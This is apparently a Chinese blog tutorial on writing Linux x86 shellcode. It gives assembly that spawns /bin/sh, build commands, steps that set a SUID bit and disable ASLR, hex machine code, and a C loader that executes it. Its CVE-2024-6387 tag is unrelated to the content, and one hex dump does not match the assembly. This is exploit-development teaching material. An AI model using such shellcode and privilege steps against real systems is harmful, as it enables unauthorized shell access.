---
title: ShellCode
date: 2024-07-29 09:04:16
tags:
  - CVE
categories:
  - CVE
  - CVE-2024-6387
---
# ubuntu(16 32位)
# 概述

## 什么是shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode**机器码**，让电脑可以执行攻击者的任意指令。
## 汇编码与机器码

### 机器码

可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。
### 汇编码

就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。
# shellcode代码

## 汇编代码(目标机32bit的ubuntu16)

```asm
section .text
section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80
```

## 使用汇编码

### 1.上述代码保存为文件（shellcode.asm）

```shell
vim shellcode.asm
```

### 2.进行汇编

```shell
nasm -f elf32 shellcode.asm -o shellcode.o
```
### 3.进行链接

```shell
ld -m elf_i386 shellcode.o -o shellcode
```

### 4.**设置SUID位（可选）**    

以root权限执行
```shell
sudo chown root:root shellcode
sudo chmod u+s shellcode
```
### 5.**禁用ASLR（可选）**

```shell
sudo sysctl -w kernel.randomize_va_space=0
```

### 6.运行可执行文件

```shell
./shellcode
```

## 汇编代码转为机器码

### 编译为二进制文件

```shell
nasm -f bin shellcode.asm -o shellcode.bin
```
### 查看机器码并转为所需格式

```shell
xxd -p shellcode.bin | sed 's/\(..\)/\\x\1/g' | fold -w 48
```
## 16进制机器码

```shellcode
\x66\x31\xc0\x66\x50\x66\xbb\x2f\x2f\x73\x68\x66
\x53\x66\xbb\x2f\x62\x69\x6e\x66\x53\x66\x89\xe3
\x66\x50\x66\x53\x66\x89
\xe1\x66\x31\xd2\xb0\x0b\xcd\x80
```

## C语言使用机器码

### 代码
```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Shellcode
unsigned char shellcode[] = 
"\x31\xc0\x50\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    // Print shellcode length
    printf("Shellcode Length: %ld\n", strlen(shellcode));

    // Allocate executable memory
    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(exec, shellcode, sizeof(shellcode));

    // Execute shellcode
    void (*execute_shellcode)() = (void (*)())exec;
    execute_shellcode();

    // Cleanup
    munmap(exec, sizeof(shellcode));

    return 0;
}
```

### 编译
使用 `-z execstack` 编译选项来允许执行堆栈上的代码:
```shell
gcc -z execstack -o shellcode shellcode.c
```



## 执行结果

- 开启shell窗口。

